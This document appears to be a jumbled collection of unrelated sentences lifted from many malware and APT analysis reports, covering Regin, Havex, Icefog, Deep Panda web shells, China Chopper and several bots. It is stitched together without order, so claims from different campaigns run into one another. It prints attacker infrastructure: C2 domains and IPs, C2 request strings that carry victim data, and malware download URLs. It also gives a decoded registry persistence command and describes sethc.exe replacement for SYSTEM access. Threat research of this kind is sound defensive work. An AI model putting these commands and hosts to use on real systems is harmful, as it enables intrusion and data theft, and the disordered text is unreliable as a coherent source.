The memory segment was dumped to disk for further analysis .
No public analysis was found except the mention in Kaspersky 's report of a custom backdoor , so CIRCL took one of the known samples and started this analysis .
Sample A has been debugged until Sample B 's decompression ﬁnished .
No persistency mechanisms have been identiﬁed .
Meanwhile , the Naxalites_Funded_By_Pakistan.scr file drops a slightly different malware component and an alternate decoy document .
file that drops a decoy document pertaining to the alleged incompetence of Pakistani authorities in locating Osama Bin Laden ( OBL ) .
This file contained a version number 1.0 , likely denoting the version of the backdoor and/or the command and control ( C2 ) backend .
The files ExtractPDF.exe and Start.exe simply serve as utilities to open the PDF file and execute the winsocks.exe backdoor component .
The winsocks.exe backdoor also contains hardcoded strings of Office file extensions , telegraphing the likely intention of the attackers in collecting and exfiltrating office automated documents from victim networks .
When executed , the winsocks.exe backdoor requests a PHP update callback at [ http : // ] 199.91.173 [ .
The main backdoor component is found in winsocks.exe .
This file was a self-extracting ( SFX ) archive that , when executed , presents the target victim with a 12 page decoy PDF document .
Another variant of this backdoor uses the same winsocks.exe with a different dropping mechanism and was found at [ http : // ] 199.91.173 [ .
In this SFX , Windows batch files had replaced the ExtractPDF.exe and Start.exe with a decoy Flash video ( FLV ) file was used in place of the decoy PDF .
The ROP payload basically tries to make memory at 0×18184000 executable , and to return to 0x1818411c to execute the shellcode .
CVE-2010-3962 , then a 0-day exploit in Internet Explorer 6 , 7 , and 8 dropped the Pirpi payload discussed in this previous case .
They are extremely proficient at lateral movement and are difficult to track , as they typically do not reuse command and control infrastructure .
When the sound object attempts to call into its vftable , it instead pivots control to the attacker 's ROP chain .
It then replaces the vftable of a sound object with a fake one that points to the newly created ROP payload .
Next , it allocates a vector object that contains a flash.Media.Sound ( ) object , which it later corrupts to pivot control to its ROP chain .
With the addresses of the aforementioned APIs and gadget , the SWF file constructs a ROP chain , and prepends it to its RC4 decrypted shellcode .
The exploit page loads a Flash SWF file to manipulate the heap layout with the common technique heap feng shui .
Then , it restores the flash.Media.Sound vftable and repairs the corrupted vector object to avoid application crashes .
The exploit leverages a previously unknown use-after-free vulnerability , and uses a well-known Flash exploitation technique to achieve arbitrary memory access and bypass Windows ' ASLR and DEP protections .
If the system has a running process named `` 360tray.exe '' , then the embedded file is stored in % SYSTEM % \MFC42LOC.DLL , then copies the source executable ( FlashUpdate.exe ) to % TEMP % \Flash.tmp and runs a new process from that location via WMI Win32_Process.Create method .
The DLL contained a backdoor payload , or , to be exact , the functionality of a fully-fledged Remote Administration Tool ( RAT ) , which gave the cyber-criminals the ability to control the victim computer without the user 's knowledge .
To summarize , it is obvious that this executable module is a backdoor , capable of taking screenshots , stealing files , downloading new files from the Internet , starting and killing processes , including interactive Windows shell commands , file search and interaction with mysql database server .
If the system has a running process named `` bdagent.exe '' , then it copies the source executable ( FlashUpdate.exe ) to % TEMP % \Flash.tmp , decodes an embedded Base64 string and executes .
While monitoring the cybercriminals ' activity on the infected machine , we noticed they uploaded the certificate they found in the infected system , and the network traffic reflected the local path indicating the place where they saved the file on their computer : These characters appear to be Korean , meaning `` desktop '' .
Each file provides a specific remote control feature and is downloaded from the attackers ' server every time the system starts up .
Then it collects system information , which includes the following : Host name OS Service Pack version System default language ID and Code page List of local drives with free space Internal hardcoded identifier ( `` 12-21 '' ) Process commandline Logged in user name System directory path Amount of free system memory CPU name Terminal services port number The information is stored in a buffer that begins with hardcoded header magic number : 0xDF1F1ED3 .
Size : 405504 MD5 : cf119a66d4c3e2355c1ec4ac316a7130 Location : C : \RECYCLER\en.exe Creation time ( UTC ) : 2012-09-06 04:08:53 Link time ( UTC ) : 2009-11-17 16:02:04 This application is a dropper , it fetches a resource called EXEFILE from current application and saves it into following paths : < CURRENT DIR > \dllcache\sethc.exe C : \WINDOWS\system32\sethc.exe Then the module uses undocumented Windows API from SFC_OS.dll , a function called SfcFileException to update the system version of C : \WINDOWS\system32\sethc.exe .
The string has the following text after decoding : reg add `` HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run '' /v FlashUpdate /t REG_EXPAND_SZ /d `` '' '' '' % APPDATA % \FlashUpdate.exe '' '' '' -update activex '' /f The module also saves current module file path to the registry in the following key location : HKCU\Software\Classes\path Next it patches the tmp file with two dword `` AAAA '' values which looks like corruption of embedded encrypted sysbin modules inside .
By replacing C : \Windows\SYSTEM32\SETHC.EXE with a custom application an attacker can run an arbitrary application with SYSTEM privileges running in zero session ( in separate desktop space from normal applications ) .
Once the encrypted third stage is read from the registry or NTFS EAs , it is decrypted using the RC5 algorithm and a fixed 16-byte key that is hardcoded in the second stage .
Just like the first stage , it loads the encrypted body of the next stage from the end of the physical disk and decrypts it with a hardcoded RC5 key , then decompresses it using the nrv2 algorithm from the UCL library .
Essentially , the second stage can remove all the Regin stages from the system , effectively cleaning the machine and leaving only the encrypted VFS behind .
Known data blocks and their configuration IDs : Known executable modules and their plugin IDs : The attackers can dynamically add and delete plugins inside the VFS and each victim installation has a different set of plugins depending on the type of activity the attackers need to execute .
Here is what the hard drive of a 64-bit system infected with Regin looks like : Interestingly , while the 32-bit Regin stage 1 runs in kernel mode , on 64-bit systems the attacker code starts in user mode .
In essence , Regin is a cyberattack platform , which the attackers deploy in victim networks for total remote control at all levels .
Known filenames for the 64-bit stage 1 : • system32\wsharp.dll – detected on a victim machine in Germany • system32\wshnetc.dll – detected on a victim machine in Belgium All the stage 1 modules for 64-bit systems were signed with fake digital certificates .
The replication modules are copied to remote computers using Windows administrative shares and then executed .
They contain an encrypted config block that points to the next stages : Once decrypted , the block contains several folder names and registry key names : In the example above , the stage 1 tries to load a second stage from the extended attributes of the system direc- tory specified in the configuration block ( in our case , the WINDOWS folder ) .
After decryption and decompression , the code checks if the next stage is a Windows PE DLL module , and if it is , it loads and executes it .
• Get bot version and uptime • Get directory file listing , all drives or from specific path • Stop activities for a given period • Download file • Send local file to the server • Execute shell command • Connect to IRC server • Change nick ( IRC ) • Join channel ( IRC ) • IRC disconnect • Remove bot from system The HTTP portion is designed to get configuration data used in the IRC botnet and to send stolen documents back to the control server .
AhnlabUpdate drops and runs an additional executable , which is the RAT payload that establishes a connection with the control server .
After executing , the remote-access Trojan makes a connection to sujewha.com , the IRC control server .
The malware joined the IRC channel # god and sent several private messages to what was likely the control server to receive instructions .
This path was contained in a dropped DLL component that was used to establish a hidden IRC channel to the attackers ' control server .
After execution the Trojan makes a connection to the control server using specific parameters that include the IRC nickname .
The remote-access Trojan had a file size of 46KB and was compiled on January 26 , five days before the MBR wiper was compiled .
The primary dropper file for this remote-access Trojan was disguised as AhnLab 's Smart Update Utility setup program .
Upon executing the malware , the main dropper ( 9263e40d9823aecf9388b64de34eae54 ) creates the file AgentBase.exe , the MBR wiper component .
This file is placed in the infected user 's application data folder , executes , and immediately starts the countdown to wipe the system and render it unbootable .
They connect to the Command and Control server wreckmove.org ( 188.240.47.145 ) via HTTP on port 80 , using a peculiar and recognizable pattern : GET /flaws/snwd.php ? tp=1 & tg= [ ID ] & tv=Error [ ] & ts= [ PLATFORM ] & mt= [ account ] & tr= [ NoFiles ] & Y1Y5F2 HTTP/1.1 Accept : */* Accept-Encoding : gzip , deflate User-Agent : Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 5.1 ; Trident/4.0 ; .NET
On this site there 's what appears to be an installer for the Bitdefender antivirus product ( bitdefender_tsecurity.zip , md5 62b702a15a762692eda296b0aea270f9 ) , but the zip file contains both a real installer and a Visual Basic trojan identical to the one used against Telenor .
C & C , C2 , CC : Command- and Control server .
The initial spear phishing mail contained two files as attachments – a document named `` 220113.doc '' , and an executable file `` few important operational documents.doc.exe '' .
Spear phishing : To send emails with malicious content ( attachments , links , or fraudulent messages ) to specific persons of particular interest .
The attacker can decide separately which infected machine should receive additional malware .
This code is encrypted , but after decryption its real purpose becomes visible : The files conhosts.exe ( MD5 02d6519b0330a34b72290845e7ed16ab ) and windwn.exe ( MD5 bfd2529e09932ac6ca18c3aaff55bd79 ) are both minimally obfuscated Visual Basic executables .
For example , the malware executable `` dua2alhycox12.exe '' ( c94267ba9c92f241379cdceed58777dc ) connects to hycoxcable.com , which anoniemvolmacht.com historically acted as name server for .
) Host : wreckmove.org Connection : Keep-Alive Other samples found connected to the case were Delphi information stealers ( some highly targeted , down to individual username ) , file splitter tools , C++ information stealers ( keyloggers , screen grabbers and file harvesters ) , and various other malware written in Visual Basic .
Typically the trojan begins by uploading system information to a PHP script on the C & C server .
Using a web shell as a primary backdoor gives Deep Panda several advantages : Low to virtually no detection by antivirus products The absence of command and control beacon traffic Impossible to block known malicious IP addresses to a web server since adversary can easily change their source IP address Cookie and HTTP header authentication aware web shells avoid being enumerated by search engines and restrict access , further reducing their network footprint To assist organizations with identifying web shells in their environment , this post will cover two popular Deep Panda web shells .
As a simple example of an encoded command , the following GET request would cause the backdoor to execute the code Response.Write ( `` < h1 > Hello World < /h1 > '' ) and would render '' Hello World '' to be printed in the web browser : Path : C : \inetpub\wwwroot\aspnet_client\system_web\ < VERSION > \ MD5 Hash : cc875db104a602e6c12196fe90559fb6 File Size : 45187 Table 4 : Metadata of `` system_web.aspx '' System_web.aspx is an excellent example of a more robust web shell used to replace Deep Panda 's traditional beaconing command and control infrastructure .
Parts two through four will provide details on successful analytical techniques you can use to discover web shells within your environment : A Web Shell is a file containing backdoor functionality written in a web scripting language such ASP , ASPX , PHP or JSP .
In short , system_web.aspx provides an adversary with a very stealthy means of near full control of the server on which it resides .
The code handles create , delete , set , get , and enum queries , while any query not matching those is executed directly .
Then executes xp_cmdshell ( which executes the Bulk Copy Program ) to copy the data from that table to a file whose name is specified in unlabeled textbox2 .
The client GUI runs on the attacker 's system and hence is not typically found within the victim network .
When a web shell is hosted on an internet facing victim system , an adversary can remotely access the system to perform malicious actions .
All commands are executed using the System.DirectoryServices API .
Provider= or Driver= - Will connect using the OleDbConnection class .
The svchost.exe initiates an outbound connection to a command and control ( C2 ) server hosted at thejoe.publicvm.com .
Packet capture on port 1321/tcp : ShadowTech Rat is a Remote Access Trojan which appears to be widely available for download on both English and Arabic language sites .
A fake `` svchost.exe '' is installed in the victim 's Application Data directory : C : \Documents and Settings\ < Username > \Application Data\svchost.exe Dropped files on execution of VPN-Pro.exe : Examination of the `` svchost.exe '' binary shows multiple references to `` ShadowTech Rat .
Excerpt from G.php : Once extracted , the binary of `` Sample A '' has the following properties : The malware also adds a registry key to make it persistent across reboots : The malware contains strings referring to `` Data Protector v2 '' which appears to refer a crypter that is compatible with a range of RATs and advertised for download in a number of forums .
Once the malware is successfully installed on the victim 's computer , it communicates with a C2 server at : tn5.linkpc.net On June 11 , this pointed to the following SyriaTel address : This domain has been active since at least October 2012 and has pointed to many different addresses in Syrian IP space on both the SyriaTel and Tarassul ISPs , as well as AnchorFree VPN addresses .
One is a malicious installer of the circumvention tool Freegate .
This is not the first time that malicious installer packages have been created for circumvention tools .
Parsing `` Sample A '' : When the victim executes the Windows shortcut , they are directed to one of several malicious links depending on the zipfile that they were sent .
In this attack , which we first observed in the second week of June , the potential victim is encouraged to visit a download link containing a malicious installer of Freegate .
Attacks often play on curiosity or ideology to encourage users to enter passwords or click on enticing files , or exploit fears of hacking and surveillance with fake security tools .
php , which provided the functionality for data exfiltration ; and utils.php , which contained the encryption functions in order to encrypt and decrypt communications between a compromised host and a C & C server .
The names of the plug-ins are : • OpenDoc • UsbDoc • UsbExe Tools The tools used by Safe are off-the-shelf programs that are able to extract saved passwords from Internet Explorer® ( IE ) and Mozilla Firefox® as well as any stored Remote Desktop Protocol ( RDP ) credentials .
Figure 4 : Check in with the C & C server During our investigation of the C & C servers associated with Safe , we discovered a backup script that the attackers used to archive the files on them .
The data that the malware sends from a compromised host to report.php is decrypted by the C & C server and stored in a MySQL™ database .
Figure 3 : RC4 key , C & C information , and campaign mark The malware then accesses a C & C server over HTTP POST to send data using the domain name and URL path in SafeCredential.DAT .
Figure 11 : Data flow diagram showing TypeConfig malware creation Figure 12 : TypeConfig and translated graphical user interfaces ( GUIs ) The fields in the TypeConfig GUI allow an attacker to specify a C & C server location and data like the malware 's name and version number , which are sent back to the attacker after a compromise .
Figure 7 : Safe 's check-in function The REQUEST_TYPE_CLIENT_REQUEST function inserts a unique ID for each compromised host as well as the Internet and external IP addresses , hostname , Windows domain , the system 's disc drive information , and a campaign mark .
The distribution mechanism the Safe campaign used involved spear- phishing emails that contain a malicious attachment .
The Safe campaign attackers used spear-phishing emails with malicious attachments .
If opened with a version of Microsoft Word® that is not up-to-date , a malicious payload is Figure 1 : Sample Safe spear-phishing email silently installed on the user 's ( aka attack vector ) computer .
Until now , we have only found spreading mechanisms that use social engineering via malicious PDF files sent over e-mail ( see Appendix F : Forged documents↓ ) .
As the malicious PDF file is opened , the Adobe process gets exploited , which results in running the dropper .
If it is a DLL file , it attempts to load it via LoadLibrary ( ) ; if it is an EXE file , it gets written on disk with one of the following names : winupdt.exe , wcsntfy.exe , netmngr.exe , dumpreport.exe , taskhosts.exe , wupdmngr.exe , winhlp.exe , dllhosts.exe , dxdiagupd.exe , dialers.exe , netschd.exe , connwiz.exe , certupdt.exe , repfault.exe , wuapreport.exe , lanmgr.exe .
The sample from 2011 checks for the current date using http : //tycho.usno.navy.mil/cgi- bin/timer.pl The sample from 2012 checks for the current date using http : //www.time- server.org/gettime.php ? country=China The samples compiled in 2013 get the current date from the operating system .
The malware checks to see if the host computer connects to the Internet through a proxy server .
In turn , upon the dropper 's execution , the host process is killed and the clean PDF file gets displayed .
When the tweet is decoded , the malware connects to the command and control server in the message and send information about the infected system .
Since we know the form of the data sent over to Command and Control centers , we might be able to get the format for the logs .
The stub overwrites the memory image of the original executable file with the backdoor so it is never written on disk .
The malware then awaits for a response from the command and control center , which comes as an encrypted GIF file .
This section presents information about some of the servers we have observed hosting and distributing malware , filename patterns , as well as a triage analysis of various pieces of malware observed delivered by these servers - Servers observed hosting and distributing malware : - Some of the filename patterns observed : - Triage analysis of various pieces of malware observed delivered by servers mentioned in this report : ( Please note that the activity in this section has been recorded per initial file infection and not individually per file downloaded and executed by the initial malware under investigation ) o Andromeda MD5 : 036eb11a5751c77bc65006769921c8e5 This file was observed hosted in the following servers : 1 .
] 140 ( China ) POST request : /newfiz3/tasks.php Data : ping=1 Server response : pong POST request : /newfiz3/tasks.php Data : getcmd=1 & uid= [ removed ] & os=Win+7+Enterprise+ ( x64 ) & av=Symantec+Endpoint+Protection & nat=yes & version=3.2.1 & serial= [ removed ] & quality=0 POST request : /newfiz3/tasks.php Data : taskexec=1 & task_id=1416470040933917 GET request : 54.69.90 [ .
Some of the main Bot types of malware detected through this research include : -­‐ Andromeda Andromeda is a modular bot that downloads modules and updates from its command and control ( C & C ) server during execution .
] 248 ( China ) POST request : /bla02/gate.php Made a copy itself to : C : \ProgramData\msitygyd.exe Hash of file copied : 13475d0fdba8dc7a648b57b10e8296d5 Registry entrenchment : Key : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\ Value name : 172157644 Value data : C : \ProgramData\msitygyd.exe Key : HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\ CurrentVersion\Policies\Explorer\Run Value name : 172157644 Value data : C : \ProgramData\msitygyd.exe Process Injection : C : \Windows\SysWOW64\msiexec.exe The malware appears to have rootkit functionality .
] 62/and40a90.exe ( US ) File downloaded : b62391f3f7cbdea02763614f60f3930f ( msitygyd.exe ) Full path and name : C : \ProgramData\msitygyd.exe Process injection : C : \Windows\SysWOW64\msiexec.exe o Beta Bot MD5 : 9e8b203f487dfa85dd47e32b3d24e24e This file was observed hosted in the following servers : 1 .
The following images were found during online research : The following table provides information about some of the servers hosting and distributing malware and some of the filename patterns discovered : The following table provides information about the relationship between the malicious servers , detection names by antivirus tools , and vertical market affected ( based on unique hashes and detections ) : A bot malware has features like anti-reversing , credential stealing/keystroke logging/form grabbing , DNS changer , process injection , antivirus process killing , blocking of security related websites , backdoor , and others .
Registry entrenchment : Key : HKCU\Software\Microsoft\Windows\CurrentVersion\Run Value Name : A38973873873 Value Data : C : \ProgramData\bett2f00\hemxccape.exe Key : HKCU\Software\Microsoft\Windows\CurrentVersion\Run Value Name : splwow64.exe Value Data : % APPDATA % \Roaming\WIN-S0MT3UJUS2O\splwow64.exe Key : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run Value Name : 172157644 Value Data : C : \ProgramData\msitygyd.exe Process Injection : C : \Windows\SysWOW64\WerFault.exe Screenshot showing a handle of the malware in the `` WerFault.exe '' process : Screenshot of related processes running in the victim system : o Andromeda Bot MD5 : 13475d0fdba8dc7a648b57b10e8296d5 This file was observed hosted in the following servers : 1 .
] 184/and40a54.exe ( China ) File downloaded : 7599016887b4d6c0e3bc2ecda983161f ( cmqgvyqtpkh.exe ) Full path and name : % TEMP % \cmqgvyqtpkh.exe Made a copy itself to : % CommonProgramFiles % \CreativeAudio\ldhkkangs.exe Hash of file copy : 9e8b203f487dfa85dd47e32b3d24e24e Registry entrenchment : Key : HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Value Name : CreativeAudio Value Data : C : \Program Files\Common Files\CreativeAudio\ldhkkangs.exe Key : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run Value Name : CreativeAudio Value Data : C : \Program Files\Common Files\CreativeAudio\ldhkkangs.exe Process Injection : C : \Program Files\Internet Explorer\iexplore.exe Screenshot of the registry activity : Screenshot showing a handle of the malware in the `` iexplorer.exe '' process : o Neutrino Bot MD5 : 463f7191363d0391add327c1270d7fe6 This file was observed hosted in the following servers : 1 .
through USB removable drives , social networking sites , and messaging clients ) , process injection , hard drive wiping , blocking access to multiple antivirus/security vendor websites , denial of service attacks , credentials stealing ( usernames and passwords ) , download and execute file , etc .
This is of great concern as the first stage attack continues to bypass network security defenses infecting user 's computers that beacon to malicious servers to download or create the second stage malware into the victim systems .
SwissRanger camera driver ( sysmain dropper ) A hijacked installer of libMesaSR used by the `` SwissRanger '' camera driver , produced by Acroname : http : //www.acroname.com/ Files details : SHA-256 : 398a69b8be2ea2b4a6ed23a55459e0469f657e6c7703871f63da63fb04cefe90 Size : 1311927 Compiled : Sat , 28 May 2011 16:04:38 UTC Detected as : Trojan.Win32.Inject.hhwa Description : trojanized installer Path : % TEMP % \tmp687.dll and % APPDATA % \sydmain.dll SHA-256 : a8e6abaa0ddc34b9db6bda17b502be7f802fb880941ce2bd0473fd9569113599 Size : 133152 Compiled : Wed , 12 Jun 2013 04:31:14 UTC Detected as : Trojan.Win32.Inject.hhwa Description : Sysmain backdoor Path : % TEMP % \setup.exe SHA-256 : 7fa188fb3bfecbd0fbbb05cfa4a3078ac44f68c63b784b20046e470613e35f96 Size : 1181500 Compiled : Sat , 05 Dec 2009 22:50:52 UTC Description : original installer , version 1.0.14.706 Registry modification : [ HKCU\Software\Microsoft\Windows\CurrentVersion\Run ] load = C : \WINDOWS\system32\rundll32.exe `` c : \documents and settings\luser\application data\sydmain.dll '' , AGTwLoad eWon software ( Havex dropper ) A hijacked installer of eCatcher - a piece of legitimate software developed by a Belgian producer of SCADA and industrial network equipment : http : //www.ewon.be/en/home.html Files details : SHA-256 : 70103c1078d6eb28b665a89ad0b3d11c1cbca61a05a18f87f6a16c79b501dfa9 Size : 43971440 Compiled : Sat , 31 Mar 2007 15:09:46 UTC Detected as : ( not detected yet ) Description : trojanized installer Url : hxxp : //www.ewon.biz/software/eCatcher/eCatcherSetup.exe Path : % TEMP % \TmProvider.dll and % SYSTEM % \TMPProvider.dll SHA-256 : 401215e6ae0b80cb845c7e2910dddf08af84c249034d76e0cf1aa31f0cf2ea67 Size : 327168 Compiled : Mon , 30 Dec 2013 12:53:48 UTC Description : Havex version 038 Path : % TEMP % \eCatcherSetup.exe SHA-256 : c7caa7fa2a23508b0a024a6a4b2dcaad34ab11ea42dffc3a452901c007cdfc34 Size : 43785864 Compiled : Fri , 19 Jun 1992 22:22:17 UTC Description : original installer , version 4.0.0.13073 Path : % TEMP % \qln.dbx Size : 2 Description : text file with Havex version number Registry modification : [ HKCU/HKLM\Software\Microsoft\Windows\CurrentVersion\Run ] TmProvider = rundll32 `` % SYSTEM % \TMPprovider038.dll '' , RunDllEntry [ HKLM\Software\Microsoft\Internet Explorer\InternetRegistry ] fertger = 269684507736283195770098FD80-25 mbCheck software ( Havex dropper ) A hijacked installer of legitimate software for the remote maintenance of PLC systems - mbCHECK produced by MB Connect Line GmbH : http : //www.mbconnectline.com/index.php/en/ Files details : SHA-256 : 0b74282d9c03affb25bbecf28d5155c582e246f0ce21be27b75504f1779707f5 Size : 1141478 Compiled : Sun , 14 Jul 2013 20:09:51 UTC ) Detected as : Trojan-Dropper.Win32.Injector.kcnn Description : Trojanized installer Path : and % SYSTEM % \svcprocess043.dll % TEMP % \mbCHECK.dll SHA-256 : d5687b5c5cec11c851e84a1d40af3ef52607575487a70224f63458c24481076c Size : 437248 Compiled : Fri , 11 Apr 2014 05:37:36 UTC Description : Havex version 043 Resource : 12.MTMxMjMxMg==.5.havex.14400000.12.Explorer.EXE.0.2.66.sinfulce lebs.freesexycomics.com/wp05/wp-admin/includes/tmp/tmp.php.90.ra pidecharge.gigfa.com/blogs/wp-content/plugins/buddypress/bp-sett ings/bp-settings-src.php.354.AATXn+MiwLu+xCoMG7SqY1uQxAk1qLdyoED 9LxIVQr2Z/gsrHIsgTvK9AusdFo+9..fzAxf1zXj42880+kUmktmVb5HSYi8T27Q 54eQ4ZLUFKPKZstgHcwPVHGdwpmmRmk..09fL3KGd9SqR60Mv7QtJ4VwGDqrzOja +Ml4SI7e60C4qDQAAAAAAAAAAAAAAAAAA..AAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..AAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..AAAAAAAAAAAAAAAAAAAAAQAB .
Writes the above information to `` testlog.php '' , separated by `` Tabulator '' and base64-encoded , with the following syntax : < timestamp > \t < victim ip-address > \t < proxy > \t < botID > \t < request-uri > \t < useragent > 3 .
`` testlog.php '' is not a PHP-script but it contains the C & C Server logfile of Backdoor-connections .
It also served up the well-known lateral movement utility 64bit Windows Credential Editor tool at kinoporno.org/wce64.exe Another example above included a credential and document stealing component , downloaded as a part of the attack chain from nahoonservices.com : 91.203.6.71/check2/muees27jxt/fl.exe CVE-2011-0611 - PDF exploit The exploit is delivered as an XDP file ( XML Data Package ) which is actually a PDF file packaged within an XML container .
If the bot executed an HTTP-POST-request , the transferred data is written to the file `` < botID > .
This file was dropped and executed by the PSW dropper module ( 71e05babc107f5e52f1a4c3ea6261 c472d2649c0b179395304c420eaa54e2062 ) .
The java exploit in turn downloaded Karagany backdoors , which in turn downloaded stealers from 91.203.6.71 : User visits utilico.co.uk → redirected to → nahoonservices.com → Java Exploits → www.nahoonservices.com/wp-content/plugins/rss-poster/start.jar www.nahoonservices.com/wp-content/plugins/rss-poster/juch.php a615d71af0c856c89bb8ebb5c6e7644d fcf7bfe68ff302869475b73e4c605a099ed2e1074e79c7b3acb2a451cd2ea915 juch.php saved as `` searchindexer.exe '' , or `` coresyns.exe '' and run , then downloads and runs ...
Mozilla Firefox CVE-2013-1690 https : //cve.mitre.org/cgi-bin/cvename.cgi ? name=cve-2013-1690 '' Mozilla Firefox before 22.0 , Firefox ESR 17.x before 17.0.7 , Thunderbird before 17.0.7 , and Thunderbird ESR 17.x before 17.0.7 do not properly handle onreadystatechange events in conjunction with page reloading , which allows remote attackers to cause a denial of service ( application crash ) or possibly execute arbitrary code via a crafted web site that triggers an attempt to execute data at an unmapped memory location .
The WorkReceive function essentially does a GET request on the C & C server in order to receive a task to complete on the infected computer .
The LIB command is used to load a DLL on the infected machine .
During our investigation , we identified several types of exploits being used through spear-phishing e-mails against the targets : > > CVE-2012-1856 ( the `` Tran Duy Linh '' ( also see : http : //blog.malwaretracker.com/2013/06/ tomato-garden-campaign-possible.html ) exploit fixed in Microsoft 's MS12-060 security bulletin ) > > CVE-2012-0158 ( the MSCOMCTL.OCX remote code execution vulnerability fixed with Microsoft 's MS12-027 security bulletin ) > > Web links to Oracle Java exploits ( CVE-2013-0422 and CVE-2012-1723 ) > > HLP exploits and abuse of features > > HWP exploits The first two vulnerabilities are exploited through Microsoft Office documents ( Word and Excel ) that drop and execute the backdoor and show a fake `` lure '' document to the victim .
Below we can see an example of the attackers copying a number of files to `` c : \temp\mslog '' from an USB flash drive connected to the computer with Korean Windows systems and preparing them for upload to the C2 : In another example , we can see them uploading and running a type `` 2 '' backdoor on top of the type '' 1 '' infection : Interestingly , the modern Icefog-NG C & C application looks very similar to Icefog Web UI - it uses the same multi-tab layout and even has the same tab titles .
To execute the code , a simple call to CreateThread ( ) suffices : The shellcode is encrypted with a simple 0xBF XOR operation : Upon execution , the shellcode installs an Icefog backdoor that communicates with the C2s at : '' www.samyongonc [ dot ] com/jd/upload.aspx '' and `` www.625tongyi [ dot ] com/jd/upload.aspx '' During our investigation , we observed Icefog attacks using HWP files .
The module requests new commands by making a POST request to the C & C server by URL `` hxxp : // appst0re.net/upload.aspx ? filepath=order & filename= % hostname % .jpg
If no known command is parsed out of the server response , the Trojan notifies the server about being alive by issuing the following HTTP POST request : After that it sleeps for 150 seconds and starts the command-processing loop again .
Here 's a look at the type `` 1 '' command-and-control server login screen : The command-and-control script ( `` control.aspx '' ) features an interesting comment '' shiyanlllllllllllllllllllllllllll '' .
The backdoor beams out to the command-and-control server at www.setchon [ dot ] com/jd/ upload.aspx The Icefog attackers are also using HLP files to infect their targets .
The attackers would set up a C & C , create a malware sample that uses it , attack the victim , infect it , and communicate with the victim machine before moving on .
It also has the ability to send stolen data by e-mail , by contacting smtp.aol.com and sending e-mail messages directly .
The response is saved to file % TMP % \order.dat The content of order.dat is converted from widechar to multibyte string and is parsed for the following command strings : If any of the commands above is found , the Trojan notifies the C & C that the command was received by issuing the following POST request : Full HTTP/1.1 headers : The cmd command expect a payload string ( < COMMAND > ) following the `` cmd_ '' prefix , so that the full command syntax looks like this : cmd_ < COMMAND > .
Examples of such attempts include luring Internet users into execution of malware and Spear Phishing .
• The analysis showed that the perpetrator succeeded in creating and uploading several files to the web server that contained malicious code , allowing the perpetrator to send commands to the server from a remote location .
Spear phishing is an e-mail spoofing fraud attempt that targets a specific organisation , seeking unauthorised access to confidential data .
The second vulnerability makes it possible for hackers to intercept the network traffic between operator and devices which may contain authentication credentials .
I installed backdoors on hundreds of workstations which allows me the ability to monitor email servers , so emails with interesting attachments can be forwarded to me .
Upon breaching the corporate network , the attackers installed malicious software on computers and stole information related to a remote administration tool which the company supplies .
These hackers typically exploit easy-to-guess passwords of users or use emails to trick users into revealing confidential information or into clicking links which lead to the download of malicious software .
Some of the major players include : • organised cyber criminals who are most known for mass stealing of personal identities and financial data , • state or corporate sponsored espionage like the Night Dragon operation which aims to steal critical intellectual and business information , • hacktivists such as Wikileaks , Anonymous and LulzSec who have amassed a large number of supporters and participants , • malicious inside personnel , as in the case of Bradley Edward Manning , a United States Army soldier who was arrested in May 2010 in Iraq on suspicion of having passed classified material to the website WikiLeaks .
The security policies of company Y were very strict : only the system administrators can install software on the workstations , and both incoming and outgoing traffic goes through a proxy server .
But in reality , the email did n't come from the charity at all ; the attachment was , in fact , a high quality fake containing a virus , allowing perpetrators to seize control of your computer , read your emails and record your passwords .
This continues to suggest that intruders either have local or remote access to headquarters systems running netsat.exe or access to another application that automates remote C2 data/file retrieval .
The headquarters component infects drives connected to its host system with the field unit component and retrieves data from the field unit on the infected drive 's return to the headquarters host system .
The following reflects observations during field unit execution from an infected external drive : File Name : netsat.exe File Size : 43520 bytes MD5 : eb8399483b55f416e48a320d68597d72 Previous analysis results indicated netsat.exe retrieved commands from an encrypted file named netwn.drv resident in the CSIDL_WINDOWS\msagent\ directory .
Netsat.exe functioned as a master application affording intruders the ability , in a selective and controlled manner , to infest removable devices with an agent application in the form of netui3.dll , aka setup35.exe , aka update.exe .
The following table reflects testing and theoretical contents of command files driving netsat.exe operation : The Following Are Hypothetical Scenarios Designed to Illustrate Possible Employment Options Possible Commands One -­ Targeting Specific Devices ( Known to Intruder From Previous netsat/netui3 Activity ) Possible Commands Two -­ Maximizing Propagation ( Theoretical ) The headquarters component ( netsat.exe ) logs certain events in a file located at CSIDL_MYPICTURES\wins .
Example log file contents are presented as follows : The following strings , which are not all inclusive or exclusive , could be used to find log files , fragments or contents on devices and on a network : Previous and continuing analysis results indicated some interesting and/or relevant aspects of this malware : The following interesting questions/assumptions emerged from previous cursory analysis of this malware : Further analysis confirms the malware 's use of an encrypted file stored on the system whereon the malware is executing without an apparent means of automatic generation .
Continuing analysis solidified the headquarters component 's Command and Control ( C2 ) scheme .
Previous reporting , ref : Fidelis Threat Advisory ( FTA ) # 1011 dated 15 Jan 2014 , introduced a malware system comprised of multiple files that reflected a means for intruders to discover and retrieve data from disparate computer systems via removable storage devices .
Interesting artifacts and observations continue to be discovered and made , such as the malware 's apparent expiration , the interesting naming convention for a directory to hold collected data , and the actors ' apparent intention to avoid certain networks or network addressing schemes .
The following command file hex editor excerpt illustrates the command file 's obfuscation in a contrived instance : Analysis efforts did not have access to 'command ' files retrieved from the victim systems for either the headquarters or the field unit applications .
It has two key components : the Web shell command-and-control ( CnC ) client binary and a text-based Web shell payload ( server component ) .
This small , text-based payload can be delivered using any of the following mechanisms : • WebDAV file upload • JBoss jmx-console or Apache Tomcat management pages ( For more details on this attack vector , read FireEye consultant Tony Lee 's explanation ) • Remote exploit with a file drop • Lateral propagation from other access After examining the server-side payload and the client used to control the Web shell , the next step to understanding China Chopper is observing its traffic .
